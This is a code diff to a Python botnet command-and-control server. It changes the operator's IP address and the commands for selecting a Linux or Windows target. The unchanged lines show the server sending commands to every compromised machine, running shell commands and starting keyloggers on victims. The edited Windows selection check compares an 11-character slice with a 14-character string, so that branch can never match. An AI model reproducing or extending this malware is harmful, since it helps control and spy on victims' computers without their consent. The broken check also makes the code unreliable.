@@ -26,7 +26,7 @@ except ImportError as err:
 #  CONSTANTS   #
 
 PORT = 1337 # Port number to receve connections from.
-IP = "172.17.0.1" # IP address of your computer. Change this!
+IP = "192.168.31.134" # IP address of your computer. Change this!
 NUM_OF_CONNECTIONS = 10 # Number of connections to accept.
 NUM_OF_THREADS = 2 # Number of threads that we will create.
 THREAD_IDS = [1, 2] # Thread identifiers.
@@ -217,12 +217,12 @@ class BotnetCmdCtrl:
 			elif cmd[:2] == 'sh': # Execute shell command on host machine.
 				run(cmd[3:].split())
 
-			elif cmd[:12] == 'select linux': # Select the Linux target to connect to.
-				index = int(cmd[13:].strip())
+			elif cmd[:10] == 'select lin': # Select the Linux target to connect to.
+				index = int(cmd[11:].strip())
 				self.send_cmd_linux_target(index)
 
-			elif cmd[:14] == 'select windows': # Select the Windows target to connect to.
-				index = int(cmd[14:].strip())
+			elif cmd[:11] == 'select windows': # Select the Windows target to connect to.
+				index = int(cmd[12:].strip())
 				self.send_cmd_windows_target(int(index))
 
 			elif cmd.strip() == 'switch': # Swithing writing modes: to stdout only, to stdout and file.
@@ -382,7 +382,7 @@ class BotnetCmdCtrl:
 		print(ORANGE, '  cnt windows >', RESET, 'Lists the amount of Windows connections (int).')
 		print(ORANGE, '  lin [command] >', RESET, 'Send command to all Linux machines.')
 		print(ORANGE, '  win [command] >', RESET, 'Send command to all Windows machines.')
-		print(ORANGE, '  select [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
+		print(ORANGE, '  select lin|win [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
 		print(ORANGE, '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
 		print(ORANGE, '  check mode >', RESET, 'Check write mode.')
 		print(ORANGE, '  lin|win keylog >', RESET, 'Begin a keylogger, store data in tmp folder, file name log.txt.')
